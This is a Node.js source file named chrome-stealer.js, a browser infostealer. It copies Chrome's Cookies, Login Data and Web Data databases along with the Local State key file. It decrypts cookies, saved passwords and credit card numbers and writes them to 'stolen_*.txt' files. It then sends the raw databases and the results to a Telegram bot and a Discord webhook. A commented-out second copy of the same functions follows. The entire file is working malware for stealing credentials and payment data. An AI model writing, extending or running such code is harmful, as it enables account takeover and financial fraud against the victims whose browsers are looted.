
// chrome-stealer.js — Final optimized version with Discord & Telegram file send + Credit Cards
const sqlite3 = require('sqlite3').verbose();
const fs = require('fs');
const path = require('path');
const fetch = require('node-fetch');
const FormData = require('form-data');
const crypto = require('crypto');

const { copyLockedFile, getMasterKey, decryptChromePassword } = require('./utils');
const { TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, DISCORD_WEBHOOK } = require('./config');

// ── Helper: Send file to Telegram ──────────────────────────────────────────────
async function sendFileToTelegram(filePath, caption) {
    if (!fs.existsSync(filePath)) {
        console.log("[INFO] File not found - skipping Telegram send");
        return;
    }

    const stats = fs.statSync(filePath);
    if (stats.size === 0) {
        console.log("[INFO] File empty - skipping Telegram send");
        return;
    }

    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('caption', caption);
    formData.append('document', fs.createReadStream(filePath), path.basename(filePath));

    try {
        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, {
            method: 'POST',
            body: formData
        });
        if (res.ok) {
            console.log(`[SUCCESS] Sent ${path.basename(filePath)} to Telegram`);
        } else {
            console.error(`[ERROR] Telegram send failed - status ${res.status}`);
        }
    } catch (e) {
        console.error(`[ERROR] Telegram send crashed:`, e.message);
    }
}

// ── Helper: Send file to Discord ───────────────────────────────────────────────
async function sendFileToDiscord(filePath, caption) {
    if (!fs.existsSync(filePath)) {
        console.log("[INFO] File not found - skipping Discord send");
        return;
    }

    const stats = fs.statSync(filePath);
    if (stats.size === 0) {
        console.log("[INFO] File empty - skipping Discord send");
        return;
    }

    const formData = new FormData();
    formData.append('file', fs.createReadStream(filePath), path.basename(filePath));
    formData.append('payload_json', JSON.stringify({ content: caption }));

    try {
        const res = await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            body: formData
        });
        if (res.ok) {
            console.log(`[SUCCESS] Sent ${path.basename(filePath)} to Discord`);
        } else {
            console.error(`[ERROR] Discord send failed - status ${res.status}`);
        }
    } catch (e) {
        console.error(`[ERROR] Discord send crashed:`, e.message);
    }
}

// ── Steal Chrome Cookies + Send files for offline decryption ───────────────────
async function stealCookies(browser = 'chrome') {
    console.log(`[DEBUG] Stealing ${browser} cookies...`);
    let basePath;
    if (browser === 'chrome') {
        basePath = path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default');
    } else {
        return [];
    }

    // Cookies DB
    const cookiesPath = path.join(basePath, 'Network', 'Cookies');
    if (!fs.existsSync(cookiesPath)) {
        console.log("[INFO] Cookies file not found");
        return [];
    }
    const tempPath = cookiesPath + '.temp';
    if (!await copyLockedFile(cookiesPath, tempPath)) {
        console.log("[INFO] Could not copy Cookies file - skipping");
        return [];
    }

    // Debug size
    try {
        const stats = fs.statSync(tempPath);
        console.log(`[DEBUG] Copied Cookies DB size: ${stats.size} bytes`);
        if (stats.size < 50000) {
            console.log("[WARNING] Copied Cookies file is unusually small - possible incomplete copy");
        }
    } catch (e) {
        console.error("[ERROR] Cannot stat copied Cookies file:", e.message);
    }

    // Send full encrypted Cookies DB early
    await sendFileToDiscord(tempPath, "Full Chrome Cookies DB (encrypted)");
    await sendFileToTelegram(tempPath, "Full Chrome Cookies DB (encrypted - decrypt offline with Local State)");

    // Send Local State (required for AES key decryption offline)
    const localStatePath = path.join(basePath, '..', 'Local State');
    if (fs.existsSync(localStatePath)) {
        const stats = fs.statSync(localStatePath);
        if (stats.size > 0) {
            await sendFileToDiscord(localStatePath, "Chrome Local State (required for offline cookie & password decryption)");
            await sendFileToTelegram(localStatePath, "Chrome Local State (master key file - use with Cookies DB)");
            console.log("[SUCCESS] Sent Local State for offline decryption");
        } else {
            console.log("[WARNING] Local State file is empty");
        }
    } else {
        console.log("[INFO] Local State file not found - offline decryption will be very limited");
    }

    let cookies = [];
    const masterKey = getMasterKey(); // Will usually be null in current setup

    try {
        const db = new sqlite3.Database(tempPath, sqlite3.OPEN_READONLY);
        cookies = await new Promise((resolve) => {
            db.all("SELECT host_key, name, encrypted_value FROM cookies", (err, rows) => {
                if (err) {
                    console.error("[ERROR] Cookies query error:", err.message);
                    resolve([]);
                } else {
                    console.log("[DEBUG] Raw cookie rows:", rows.length);
                    const result = [];
                    rows.forEach(row => {
                        let decrypted = null;
                        const enc = row.encrypted_value;

                        if (enc && enc.length > 15) {
                            const prefix = enc.slice(0, 3).toString();
                            if (prefix === 'v10' || prefix === 'v11') {
                                if (masterKey) {
                                    try {
                                        const iv = enc.slice(3, 15);
                                        const ciphertext = enc.slice(15, -16);
                                        const tag = enc.slice(-16);

                                        const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
                                        decipher.setAuthTag(tag);
                                        const decryptedBuffer = Buffer.concat([
                                            decipher.update(ciphertext),
                                            decipher.final()
                                        ]);
                                        decrypted = decryptedBuffer.toString('utf8');
                                    } catch (e) {
                                        console.log("[DEBUG] AES-GCM decrypt failed for", row.host_key, row.name, ":", e.message);
                                    }
                                } else {
                                    console.log("[DEBUG] No valid master key available - skipping decryption for", row.host_key, row.name);
                                }
                            }
                        }

                        result.push({
                            domain: row.host_key,
                            name: row.name,
                            encrypted_value: enc ? enc.toString('base64') : '[empty]',
                            decrypted_value: decrypted || 'FAILED (use offline tool)'
                        });
                    });
                    resolve(result);
                }
                db.close();
            });
        });

        console.log("[SUCCESS] Found", cookies.length, "cookies");

        // Save summary with note about offline decryption
        if (cookies.length > 0) {
            const outputPath = path.join(process.env.TEMP || 'C:\\Windows\\Temp', 'stolen_cookies.txt');
            let text = "Stolen Chrome Cookies - Runtime decryption limited\n";
            text += "→ Use offline Python tool + Local State file for full decryption\n\n";

            cookies.forEach(c => {
                text += `Domain: ${c.domain}\n`;
                text += `Name: ${c.name}\n`;
                text += `Encrypted (base64): ${c.encrypted_value}\n`;
                text += `Decrypted: ${c.decrypted_value}\n`;
                text += "----------------------------------------\n\n";
            });

            fs.writeFileSync(outputPath, text);
            console.log(`[SUCCESS] Saved summary to: ${outputPath}`);

            await sendFileToTelegram(outputPath, `Chrome Cookies (${cookies.length} entries - decrypt offline recommended)`);
            await sendFileToDiscord(outputPath, `Chrome Cookies (${cookies.length} entries - decrypt offline recommended)`);
        }
    } catch (e) {
        console.error("[ERROR] Cookies steal crashed:", e.message);
    } finally {
        try { fs.unlinkSync(tempPath); } catch {}
    }

    return cookies;
}


// ── Steal Chrome Passwords ─────────────────────────────────────────────────────
async function stealChromePasswords() {
    console.log("[DEBUG] Stealing Chrome passwords...");

    const isMac = process.platform === 'darwin';
    const basePath = isMac
        ? path.join(process.env.HOME, 'Library/Application Support/Google/Chrome/Default')
        : path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default');

    const loginPath = path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'Login Data');
    console.log("[DEBUG] Login Data path:", loginPath);

    if (!fs.existsSync(loginPath)) {
        console.log("[INFO] Login Data file not found - skipping passwords");
        return [];
    }
    console.log("[DEBUG] Login Data file exists");

    const tempPath = loginPath + '.temp';
    const copySuccess = await copyLockedFile(loginPath, tempPath);
    console.log("[DEBUG] Copy result for Login Data:", copySuccess);

    if (!copySuccess) {
        console.log("[INFO] Copy failed - no Login Data sent");
        return [];
    }

    // Debug size
    try {
        const stats = fs.statSync(tempPath);
        console.log(`[DEBUG] Copied Login Data size: ${stats.size} bytes`);
        if (stats.size < 10000) {
            console.log("[WARNING] Copied Login Data too small - possible incomplete");
        }
    } catch (e) {
        console.error("[ERROR] Cannot stat Login Data copy:", e.message);
    }

    // Send raw DB regardless of master key
    console.log("[DEBUG] Sending Login Data.temp");
    await sendFileToDiscord(tempPath, "Full Chrome Login Data DB (encrypted - decrypt offline)");
    await sendFileToTelegram(tempPath, "Full Chrome Login Data DB (encrypted - decrypt offline with Local State)");
    console.log("[DEBUG] Login Data sent");

    // Master key attempt (for runtime if possible, but not required for send)
    const masterKey = getMasterKey();
    if (!masterKey) {
        console.log("[INFO] Master key not obtained - runtime decryption skipped (offline still possible)");
    }

    let passwords = [];
    try {
        const db = new sqlite3.Database(tempPath, sqlite3.OPEN_READONLY);
        passwords = await new Promise((resolve) => {
            db.all("SELECT origin_url, username_value, password_value FROM logins", (err, rows) => {
                if (err) {
                    console.error("[ERROR] DB query error:", err.message);
                    resolve([]);
                    return;
                }
                console.log("[DEBUG] Raw password rows:", rows.length);
                const result = [];
                rows.forEach(row => {
                    const pass = decryptChromePassword(row.password_value, masterKey);
                    console.log(
                        `URL: ${row.origin_url} | User: ${row.username_value} | ` +
                        `Pass decrypted: ${pass ? 'YES' : 'FAILED'} (length: ${pass ? pass.length : 0})`
                    );
                    if (pass) result.push({ url: row.origin_url, user: row.username_value, pass });
                });
                resolve(result);
                db.close();
            });
        });

        console.log("[SUCCESS] Found", passwords.length, "decrypted passwords");

        if (passwords.length > 0) {
            const outputPath = path.join(process.env.TEMP || 'C:\\Windows\\Temp', 'stolen_passwords.txt');
            let text = "Stolen Chrome Passwords (runtime limited - offline recommended)\n\n";
            passwords.forEach(p => {
                text += `URL: ${p.url}\nUsername: ${p.user}\nPassword: ${p.pass}\n---\n`;
            });
            fs.writeFileSync(outputPath, text);
            await sendFileToTelegram(outputPath, `Chrome Passwords (${passwords.length} entries)`);
        }
    } catch (e) {
        console.error("[ERROR] Password processing crashed:", e.message);
    } finally {
        try { fs.unlinkSync(tempPath); } catch {}
    }

    return passwords;
}

// ── NEW: Credit Card Stealer (merged from browser module) ─────────────────────
async function stealCreditCards() {
    console.log("[CREDIT-CARDS] Stealing Chrome credit cards...");

    const basePath = path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default');
    const webDataPath = path.join(basePath, 'Web Data');
    const tempPath = webDataPath + '.temp';

    if (!fs.existsSync(webDataPath)) {
        console.log("[INFO] Web Data file not found - skipping credit cards");
        return [];
    }

    if (!await copyLockedFile(webDataPath, tempPath)) {
        console.log("[INFO] Could not copy Web Data file");
        return [];
    }

    let cards = [];
    try {
        const db = new sqlite3.Database(tempPath, sqlite3.OPEN_READONLY);

        cards = await new Promise((resolve) => {
            db.all("SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards", (err, rows) => {
                if (err) {
                    console.error("[ERROR] Credit card DB query error:", err.message);
                    resolve([]);
                } else {
                    const result = rows.map(row => ({
                        name: row.name_on_card || "Unknown",
                        number: decryptChromePassword(row.card_number_encrypted) || "DECRYPT_FAILED",
                        expiry: `${row.expiration_month || '??'}/${row.expiration_year || '??'}`
                    })).filter(c => c.number !== "DECRYPT_FAILED");
                    resolve(result);
                }
                db.close();
            });
        });

        console.log(`[CREDIT-CARDS] Found ${cards.length} credit cards`);

        if (cards.length > 0) {
            const outputPath = path.join(process.env.TEMP || 'C:\\Windows\\Temp', 'stolen_credit_cards.txt');
            let text = "Stolen Chrome Credit Cards\n\n";
            cards.forEach(c => {
                text += `Name: ${c.name}\nNumber: ${c.number}\nExpiry: ${c.expiry}\n---\n`;
            });
            fs.writeFileSync(outputPath, text);
            console.log(`[SUCCESS] Saved credit cards to: ${outputPath}`);

            await sendFileToTelegram(outputPath, `Chrome Credit Cards (${cards.length} found)`);
            await sendFileToDiscord(outputPath, `Chrome Credit Cards (${cards.length} found)`);
        }
    } catch (e) {
        console.error("[ERROR] Credit card steal crashed:", e.message);
    } finally {
        try { fs.unlinkSync(tempPath); } catch {}
    }

    return cards;
}

module.exports = {
    stealCookies,
    stealChromePasswords,
    stealCreditCards   // ← NEW: Credit cards now integrated
};
/**
// ── Steal Chrome Passwords ─────────────────────────────────────────────────────
async function stealChromePasswords() {
    console.log("[DEBUG] Stealing Chrome passwords...");

    const isMac = process.platform === 'darwin';
    const basePath = isMac
        ? path.join(process.env.HOME, 'Library/Application Support/Google/Chrome/Default')
        : path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default');

    const loginPath = path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'Login Data');
    console.log("[DEBUG] Login Data path:", loginPath);

    if (!fs.existsSync(loginPath)) {
        console.log("[INFO] Login Data file not found - skipping passwords");
        return [];
    }
    console.log("[DEBUG] Login Data file exists");

    const tempPath = loginPath + '.temp';
    const copySuccess = await copyLockedFile(loginPath, tempPath);
    console.log("[DEBUG] Copy result for Login Data:", copySuccess);

    if (!copySuccess) {
        console.log("[INFO] Copy failed - no Login Data sent");
        return [];
    }

    // Debug size
    try {
        const stats = fs.statSync(tempPath);
        console.log(`[DEBUG] Copied Login Data size: ${stats.size} bytes`);
        if (stats.size < 10000) {
            console.log("[WARNING] Copied Login Data too small - possible incomplete");
        }
    } catch (e) {
        console.error("[ERROR] Cannot stat Login Data copy:", e.message);
    }

    // Send raw DB regardless of master key
    console.log("[DEBUG] Sending Login Data.temp");
    await sendFileToDiscord(tempPath, "Full Chrome Login Data DB (encrypted - decrypt offline)");
    await sendFileToTelegram(tempPath, "Full Chrome Login Data DB (encrypted - decrypt offline with Local State)");
    console.log("[DEBUG] Login Data sent");

    // Master key attempt (for runtime if possible, but not required for send)
    const masterKey = getMasterKey();
    if (!masterKey) {
        console.log("[INFO] Master key not obtained - runtime decryption skipped (offline still possible)");
    }

    let passwords = [];
    try {
        const db = new sqlite3.Database(tempPath, sqlite3.OPEN_READONLY);
        passwords = await new Promise((resolve) => {
            db.all("SELECT origin_url, username_value, password_value FROM logins", (err, rows) => {
                if (err) {
                    console.error("[ERROR] DB query error:", err.message);
                    resolve([]);
                    return;
                }
                console.log("[DEBUG] Raw password rows:", rows.length);
                const result = [];
                rows.forEach(row => {
                    const pass = decryptChromePassword(row.password_value, masterKey);
                    console.log(
                        `URL: ${row.origin_url} | User: ${row.username_value} | ` +
                        `Pass decrypted: ${pass ? 'YES' : 'FAILED'} (length: ${pass ? pass.length : 0})`
                    );
                    if (pass) result.push({ url: row.origin_url, user: row.username_value, pass });
                });
                resolve(result);
                db.close();
            });
        });

        console.log("[SUCCESS] Found", passwords.length, "decrypted passwords");

        if (passwords.length > 0) {
            const outputPath = path.join(process.env.TEMP || 'C:\\Windows\\Temp', 'stolen_passwords.txt');
            let text = "Stolen Chrome Passwords (runtime limited - offline recommended)\n\n";
            passwords.forEach(p => {
                text += `URL: ${p.url}\nUsername: ${p.user}\nPassword: ${p.pass}\n---\n`;
            });
            fs.writeFileSync(outputPath, text);
            await sendFileToTelegram(outputPath, `Chrome Passwords (${passwords.length} entries)`);
        }
    } catch (e) {
        console.error("[ERROR] Password processing crashed:", e.message);
    } finally {
        try { fs.unlinkSync(tempPath); } catch {}
    }

    return passwords;
}

// ── Steal Chrome Cookies + Send files for offline decryption ───────────────────
async function stealCookies(browser = 'chrome') {
    console.log(`[DEBUG] Stealing ${browser} cookies...`);
    let basePath;
    if (browser === 'chrome') {
        basePath = path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default');
    } else {
        return [];
    }

    // Cookies DB
    const cookiesPath = path.join(basePath, 'Network', 'Cookies');
    if (!fs.existsSync(cookiesPath)) {
        console.log("[INFO] Cookies file not found");
        return [];
    }
    const tempPath = cookiesPath + '.temp';
    if (!await copyLockedFile(cookiesPath, tempPath)) {
        console.log("[INFO] Could not copy Cookies file - skipping");
        return [];
    }

    // Debug size
    try {
        const stats = fs.statSync(tempPath);
        console.log(`[DEBUG] Copied Cookies DB size: ${stats.size} bytes`);
        if (stats.size < 50000) {
            console.log("[WARNING] Copied Cookies file is unusually small - possible incomplete copy");
        }
    } catch (e) {
        console.error("[ERROR] Cannot stat copied Cookies file:", e.message);
    }

    // Send full encrypted Cookies DB early
    await sendFileToDiscord(tempPath, "Full Chrome Cookies DB (encrypted)");
    await sendFileToTelegram(tempPath, "Full Chrome Cookies DB (encrypted - decrypt offline with Local State)");

    // Send Local State (required for AES key decryption offline)
    const localStatePath = path.join(basePath, '..', 'Local State');
    if (fs.existsSync(localStatePath)) {
        const stats = fs.statSync(localStatePath);
        if (stats.size > 0) {
            await sendFileToDiscord(localStatePath, "Chrome Local State (required for offline cookie & password decryption)");
            await sendFileToTelegram(localStatePath, "Chrome Local State (master key file - use with Cookies DB)");
            console.log("[SUCCESS] Sent Local State for offline decryption");
        } else {
            console.log("[WARNING] Local State file is empty");
        }
    } else {
        console.log("[INFO] Local State file not found - offline decryption will be very limited");
    }

    let cookies = [];
    const masterKey = getMasterKey(); // Will usually be null in current setup

    try {
        const db = new sqlite3.Database(tempPath, sqlite3.OPEN_READONLY);
        cookies = await new Promise((resolve) => {
            db.all("SELECT host_key, name, encrypted_value FROM cookies", (err, rows) => {
                if (err) {
                    console.error("[ERROR] Cookies query error:", err.message);
                    resolve([]);
                } else {
                    console.log("[DEBUG] Raw cookie rows:", rows.length);
                    const result = [];
                    rows.forEach(row => {
                        let decrypted = null;
                        const enc = row.encrypted_value;

                        if (enc && enc.length > 15) {
                            const prefix = enc.slice(0, 3).toString();
                            if (prefix === 'v10' || prefix === 'v11') {
                                if (masterKey) {
                                    try {
                                        const iv = enc.slice(3, 15);
                                        const ciphertext = enc.slice(15, -16);
                                        const tag = enc.slice(-16);

                                        const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
                                        decipher.setAuthTag(tag);
                                        const decryptedBuffer = Buffer.concat([
                                            decipher.update(ciphertext),
                                            decipher.final()
                                        ]);
                                        decrypted = decryptedBuffer.toString('utf8');
                                    } catch (e) {
                                        console.log("[DEBUG] AES-GCM decrypt failed for", row.host_key, row.name, ":", e.message);
                                    }
                                } else {
                                    console.log("[DEBUG] No valid master key available - skipping decryption for", row.host_key, row.name);
                                }
                            }
                        }

                        result.push({
                            domain: row.host_key,
                            name: row.name,
                            encrypted_value: enc ? enc.toString('base64') : '[empty]',
                            decrypted_value: decrypted || 'FAILED (use offline tool)'
                        });
                    });
                    resolve(result);
                }
                db.close();
            });
        });

        console.log("[SUCCESS] Found", cookies.length, "cookies");

        // Save summary with note about offline decryption
        if (cookies.length > 0) {
            const outputPath = path.join(process.env.TEMP || 'C:\\Windows\\Temp', 'stolen_cookies.txt');
            let text = "Stolen Chrome Cookies - Runtime decryption limited\n";
            text += "→ Use offline Python tool + Local State file for full decryption\n\n";

            cookies.forEach(c => {
                text += `Domain: ${c.domain}\n`;
                text += `Name: ${c.name}\n`;
                text += `Encrypted (base64): ${c.encrypted_value}\n`;
                text += `Decrypted: ${c.decrypted_value}\n`;
                text += "----------------------------------------\n\n";
            });

            fs.writeFileSync(outputPath, text);
            console.log(`[SUCCESS] Saved summary to: ${outputPath}`);

            await sendFileToTelegram(outputPath, `Chrome Cookies (${cookies.length} entries - decrypt offline recommended)`);
            await sendFileToDiscord(outputPath, `Chrome Cookies (${cookies.length} entries - decrypt offline recommended)`);
        }
    } catch (e) {
        console.error("[ERROR] Cookies steal crashed:", e.message);
    } finally {
        try { fs.unlinkSync(tempPath); } catch {}
    }

    return cookies;
}

// ── NEW: Credit Card Stealer (merged from browser module) ─────────────────────
async function stealCreditCards() {
    console.log("[CREDIT-CARDS] Stealing Chrome credit cards...");

    const basePath = path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default');
    const webDataPath = path.join(basePath, 'Web Data');
    const tempPath = webDataPath + '.temp';

    if (!fs.existsSync(webDataPath)) {
        console.log("[INFO] Web Data file not found - skipping credit cards");
        return [];
    }

    if (!await copyLockedFile(webDataPath, tempPath)) {
        console.log("[INFO] Could not copy Web Data file");
        return [];
    }

    let cards = [];
    try {
        const db = new sqlite3.Database(tempPath, sqlite3.OPEN_READONLY);

        cards = await new Promise((resolve) => {
            db.all("SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards", (err, rows) => {
                if (err) {
                    console.error("[ERROR] Credit card DB query error:", err.message);
                    resolve([]);
                } else {
                    const result = rows.map(row => ({
                        name: row.name_on_card || "Unknown",
                        number: decryptChromePassword(row.card_number_encrypted) || "DECRYPT_FAILED",
                        expiry: `${row.expiration_month || '??'}/${row.expiration_year || '??'}`
                    })).filter(c => c.number !== "DECRYPT_FAILED");
                    resolve(result);
                }
                db.close();
            });
        });

        console.log(`[CREDIT-CARDS] Found ${cards.length} credit cards`);

        if (cards.length > 0) {
            const outputPath = path.join(process.env.TEMP || 'C:\\Windows\\Temp', 'stolen_credit_cards.txt');
            let text = "Stolen Chrome Credit Cards\n\n";
            cards.forEach(c => {
                text += `Name: ${c.name}\nNumber: ${c.number}\nExpiry: ${c.expiry}\n---\n`;
            });
            fs.writeFileSync(outputPath, text);
            console.log(`[SUCCESS] Saved credit cards to: ${outputPath}`);

            await sendFileToTelegram(outputPath, `Chrome Credit Cards (${cards.length} found)`);
            await sendFileToDiscord(outputPath, `Chrome Credit Cards (${cards.length} found)`);
        }
    } catch (e) {
        console.error("[ERROR] Credit card steal crashed:", e.message);
    } finally {
        try { fs.unlinkSync(tempPath); } catch {}
    }

    return cards;
}

module.exports = { 
    stealChromePasswords, 
    stealCookies, 
    stealCreditCards   // ← NEW: Credit cards now integrated
};
*/
